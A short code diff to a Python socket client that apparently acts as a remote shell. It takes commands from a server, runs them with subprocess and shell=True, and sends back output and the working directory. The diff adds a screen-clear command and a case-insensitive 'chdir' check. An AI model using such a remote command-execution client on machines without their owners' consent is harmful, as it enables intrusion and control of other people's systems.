@@ -393,6 +393,14 @@ class Client(object):
                 self.socket.send(b' ')
                 continue
 
+            if data[0] == 'CLEAR':
+                if platform.system() == 'Windows':
+                    os.system('cls')
+                else:
+                    os.system('clear')
+                self.send(b'DONE')
+                continue
+
             if data[0] == 'LISTENING':
                 self.send(b'DONE')
                 continue
@@ -489,7 +497,7 @@ class Client(object):
                     self.send(os.getcwdb())
                     continue
 
-                if data[1][:2].lower() == 'cd' or data[1][:5] == 'chdir':
+                if data[1][:2].lower() == 'cd' or data[1][:5].lower() == 'chdir':
                     process = subprocess.Popen(data[1] + self._pwd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                     error = process.stderr.read().decode()
                     if error == "":
